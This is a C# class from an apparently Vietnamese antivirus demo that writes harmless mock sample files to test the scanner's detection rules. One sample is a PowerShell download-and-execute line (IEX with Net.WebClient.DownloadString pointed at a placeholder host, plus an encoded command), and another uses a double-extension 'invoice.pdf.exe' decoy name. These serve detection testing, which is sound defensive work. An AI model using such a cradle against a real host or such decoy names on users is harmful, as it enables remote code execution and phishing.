using System;
using System.Collections.Generic;
using System.IO;

namespace ScanAndRemoveVirus.Services
{
    /// <summary>
    /// Bộ "virus mock" chính chủ: 6 tệp VÔ HẠI tái hiện đúng 3 kỹ thuật phát hiện.
    /// Vị trí CHUẨN: thư mục Samples\ ngay trong project (repo đã gồm sẵn file;
    /// FindSamplesFolder tìm từ thư mục exe đi lên). Nếu app chạy ngoài repo ->
    /// fallback tạo ở Desktop\XVirus-Samples. Create() (nút "Tạo tệp mẫu") chỉ
    /// phục hồi/ghi đè nội dung — idempotent.
    /// </summary>
    public static class TestSamples
    {
        public const string SignatureSampleName = "mau-ky-hieu.txt";            // KT1: prefix
        public const string HashSampleName = "mau-hash-sha256.txt";              // KT1: hash bảng chữ ký
        public const string EicarNameSample = "demo_eicar_named.dat";            // KT1: luật tên chứa "eicar"
        public const string SpoofSampleName = "thong-bao-hoa-don-invoice.pdf.exe"; // KT2: đuôi kép + mồi câu
        public const string ScriptSampleName = "update-flash.ps1";               // KT2: marker PowerShell độc
        public const string BenignSampleName = "README-mau.txt";                 // đối chứng: KHÔNG được báo

        private static string cachedFolder;

        public static string FolderPath
        {
            get
            {
                if (cachedFolder != null) return cachedFolder;
                // Tìm Samples\ gần nhất bằng cách leo lên từ thư mục exe
                // (bin\Debug -> project -> repo Samples; fallback Desktop khi chạy ngoài repo)
                var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
                for (int hop = 0; hop < 7 && dir != null; hop++, dir = dir.Parent)
                {
                    string cand = Path.Combine(dir.FullName, "Samples");
                    if (Directory.Exists(cand)) { cachedFolder = cand; return cand; }
                }
                cachedFolder = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "XVirus-Samples");
                return cachedFolder;
            }
        }

        /// <summary>Tạo (đè nếu tồn tại) bộ mẫu; trả về danh sách đường dẫn. Idempotent.</summary>
        public static List<string> Create()
        {
            Directory.CreateDirectory(FolderPath);
            var made = new List<string>();
            made.Add(Write(SignatureSampleName,
                ScanEngine.TestSignature + "day-la-mau-gia-lap-vo-hai"));
            made.Add(Write(HashSampleName, ScanEngine.SignatureSampleContent));
            made.Add(Write(EicarNameSample, "Ten trung chuan EICAR chi de duoc phat hian theo ten."));
            made.Add(Write(SpoofSampleName, "Khong phai PE that - chi-la-mau-duoi-kep."));
            made.Add(Write(ScriptSampleName,
                "$ErrorActionPreference='SilentlyContinue';"
                + "IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/p');"
                + " $e=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQ=='));"
                + " powershell -nop -enc TQ=="));
            made.Add(Write(BenignSampleName,
                "Day la tep doi chung SACH: quyet ca thu muc nay chi duoc phép báo ĐÚNG 5 tep mau tren."));
            return made;
        }

        private static string Write(string name, string content)
        {
            string path = Path.Combine(FolderPath, name);
            File.WriteAllText(path, content);
            return path;
        }
    }
}
